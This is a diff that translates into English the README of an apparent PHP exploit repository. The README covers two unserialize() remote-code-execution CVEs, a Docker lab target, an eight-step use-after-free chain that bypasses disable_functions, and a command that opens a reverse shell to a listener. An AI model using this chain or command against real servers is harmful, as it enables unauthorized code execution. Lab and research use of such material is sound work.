@@ -1,101 +1,101 @@
 # PHP2SHELL — CVE-2026-109618 / CVE-2026-109619
 
-**Karim BOUDRA @ ULTRADEFENSE LAB** · 21 octobre 2026 · lab uniquement
+**Karim BOUDRA @ ULTRADEFENSE LAB** · October 21, 2026 · lab use only
 
 ![CVE-2026-109618](https://img.shields.io/badge/CVE--2026--109618-RCE-red)
 ![CVE-2026-109619](https://img.shields.io/badge/CVE--2026--109619-RCE-red)
-![PHP](https://img.shields.io/badge/PHP-8.5.11%20vulnérable-blue)
-![Chaînes](https://img.shields.io/badge/RCE-4%2F4%20confirmées-brightgreen)
-![Portée](https://img.shields.io/badge/portée-lab%20uniquement-yellow)
+![PHP](https://img.shields.io/badge/PHP-8.5.11%20vulnerable-blue)
+![Chains](https://img.shields.io/badge/RCE-4%2F4%20confirmed-brightgreen)
+![Scope](https://img.shields.io/badge/scope-lab%20only-yellow)
 
-## Démonstration vidéo
+## Video demonstration
 
-[![Aperçu animé de la démonstration PHP2SHELL](POC-preview.gif)](POC-demo.mp4)
+[![Animated preview of the PHP2SHELL demonstration](POC-preview.gif)](POC-demo.mp4)
 
-**[▶ Lire la vidéo complète](POC-demo.mp4)**
+**[▶ Play the full video](POC-demo.mp4)**
 
-Deux RCE dans le coeur de `unserialize()` de PHP (branches `C:` Serializable et
-`E:` enum-autoload du `var_unserializer.re`), reproduites le jour même du patch :
-root en local avec `disable_functions` contourné, shell `www-data` à distance en
-~2 200 requêtes, en HTTP comme en TLS, pour les deux CVE.
+Two RCEs in PHP's `unserialize()` core (`C:` Serializable and `E:` enum-autoload
+branches in `var_unserializer.re`), reproduced on the day the patch was released:
+local root with `disable_functions` bypassed, and a remote `www-data` shell in
+~2,200 requests over both HTTP and TLS, for both CVEs.
 
 ## Structure
 
-```
-LAB/                     cible vulnérable en Docker, config bridge
-  Dockerfile             php:8.5.11-apache épinglé, deux portes + TLS + checker
-  docker-compose.yml     network_mode: bridge, ports 8486 (http) / 8483 (https)
-  run.sh                 up | status | down | clean
-  remote_app.php         porte C: (Serializable)
-  remote_app_enum.php    porte E: (autoload d'enum)
-  check.php              détecteur safe des 2 branches + scan des sinks
-POC/
-  POCKETPOC-PHP2SHELL.py         exploit avec reverse shell
-index.html               page du dépôt
-```
+- `LAB/` — vulnerable Docker target with bridge networking
+  - `Dockerfile` — PHP 8.5.11 Apache, two entry points, TLS, and checker
+  - `docker-compose.yml` — bridge network, ports 8486 (HTTP) and 8483 (HTTPS)
+  - `run.sh` — `up | status | down | clean`
+  - `remote_app.php` — `C:` entry point (`Serializable`)
+  - `remote_app_enum.php` — `E:` entry point (enum autoload)
+  - `check.php` — safe detector for both branches and sink scanner
+- `POC/`
+  - [POCKETPOC-PHP2SHELL.py](https://github.com/KarimUD7/RCE-POCKET-POC-for-PHP2SHELL/blob/main/POC/POCKETPOC-PHP2SHELL.py "POCKETPOC-PHP2SHELL.py")
+- `POC-demo.mp4` — full video
+- `POC-preview.gif` — animated preview
+- `README.md` — documentation
+- `index.html` — repository page
 
-## Prérequis
+## Prerequisites
 
-| Outil | Rôle | Testé avec |
+| Tool | Purpose | Tested with |
 |---|---|---|
-| Python >= 3.8 | exploits distants `php8_remote*.py` | 3.14.5 (macOS arm64) |
-| PHP CLI >= 7.4 | PoC de poche `pocket_poc.php` | 8.5.11 (NTS) |
-| Docker + Compose | lab cible `LAB/` | 29.6.2 / v5.1.4 |
-
+| Python >= 3.8 | remote exploits `php8_remote*.py` | 3.14.5 (macOS arm64) |
+| PHP CLI >= 7.4 | pocket PoC `pocket_poc.php` | 8.5.11 (NTS) |
+| Docker + Compose | target lab `LAB/` | 29.6.2 / v5.1.4 |
 
 ```bash
-python3 --version                  # >= 3.8 requis
-php --version                      # CLI, pour le PoC de poche
-docker compose version             # pour LAB/run.sh
+python3 --version                  # >= 3.8 required
+php --version                      # CLI, for the pocket PoC
+docker compose version             # for LAB/run.sh
 ```
 
-## Démarrage
+## Getting started
 
 ```bash
 cd LAB
-./run.sh up          # build + conteneur bridge, écoute sur toutes les interfaces
-# local : http://127.0.0.1:8486     lan : http://iplan:8486
+./run.sh up          # build + bridge container, listening on all interfaces
+# local: http://127.0.0.1:8486     LAN: http://iplan:8486
 ```
 
 ## Exploitation
 
 ```bash
-# détection de poche (n'importe quel serveur PHP)
+# pocket detection (any PHP server)
 python3 POCKETPOC-PHP2SHELL.py --url http://172.20.10.5:8486/remote_app.php --reverse 172.20.10.5:4444
 ```
 
-## Résultats vérifiés (php:8.5.11)
+## Verified results (php:8.5.11)
 
-| Chaîne | Requêtes | Résultat |
+| Chain | Requests | Result |
 |---|---|---|
-| C: HTTP | 2 169 | www-data RCE |
-| C: HTTPS | 2 169 | www-data RCE |
-| E: HTTP | 2 281 | www-data RCE |
-| E: HTTPS | 2 175 | www-data RCE |
-| C: / E: local | - | root, `disable_functions` contourné |
+| C: HTTP | 2,169 | www-data RCE |
+| C: HTTPS | 2,169 | www-data RCE |
+| E: HTTP | 2,281 | www-data RCE |
+| E: HTTPS | 2,175 | www-data RCE |
+| C: / E: local | - | root, `disable_functions` bypassed |
 
-## La chaîne en huit étapes
+## The chain in eight steps
 
-1. gadget `unserialize($data)->x = 0;` (porte C:) ou autoload d'enum (porte E:)
-2. payload `a:41:{...}` : porte + stdClass 8 props + 32 sprays + `R:4..11`
-3. resize 8 vers 16 : `efree()` de l'arData, slots 4..11 pointent dedans (UAF)
-4. reclaim : les sprays de 280 octets réoccupent le bin-320 libéré
-5. leak heap : write-through `R:N` d'un pointeur `zend_reference`
-6. `uaf_read(addr, n)` : fausse `IS_STRING` positionnée n'importe où
-7. closure factice : `ce`, `handlers`, `func.handler = zif_system` (résolu
-   dans la table statique du module, d'où le contournement de `disable_functions`)
-8. dispatch : `$result[33]("id")` en local ; `serialize()` + vtable factice
-   `system()` à distance
+1. `unserialize($data)->x = 0;` gadget (`C:` entry point) or enum autoload (`E:` entry point)
+2. `a:41:{...}` payload: entry point + stdClass with 8 properties + 32 sprays + `R:4..11`
+3. resize from 8 to 16: `efree()` releases arData; slots 4..11 point into it (UAF)
+4. reclaim: the 280-byte sprays reclaim the freed bin-320
+5. heap leak: write-through via `R:N` of a `zend_reference` pointer
+6. `uaf_read(addr, n)`: fake `IS_STRING` positioned at an arbitrary address
+7. fake closure: `ce`, `handlers`, `func.handler = zif_system` (resolved in the
+   module's static function table, thereby bypassing `disable_functions`)
+8. dispatch: `$result[33]("id")` locally; `serialize()` + fake vtable invoking
+   `system()` remotely
 
-## Avertissement
+## Warning
 
-Le bug n'est exploitable que si l'application cible passe des données attaquables
-à `unserialize()`. Contre un tiers : autorisation écrite + crash-DoS ROE. Ce
-dépôt est un lab : ne l'exposez que sur des réseaux contrôlés, refermez-le
-avec `./run.sh down` après usage.
+The bug is exploitable only when the target application passes attacker-controlled
+data to `unserialize()`. Testing a third party requires written authorization and
+crash-DoS rules of engagement. This repository is a lab: expose it only on controlled
+networks, and shut it down with `./run.sh down` after use.
 
-Crédits recherche : Calif (MAD Bugs, PoC C: public), Nicolas Grekas (GH-23981,
-branche E:). Variantes E:, 
+Research credits: Calif (MAD Bugs, public `C:` PoC), Nicolas Grekas (GH-23981,
+`E:` branch). `E:` variants.
 
-POC author : Karim BOUDRA @ ULTRADEFENSE LAB.
-Greetings : CYBERSEC TEAM / ULTRADEFENSE TEAM
+PoC author: Karim BOUDRA @ ULTRADEFENSE LAB.
+Greetings: CYBERSEC TEAM / ULTRADEFENSE TEAM.
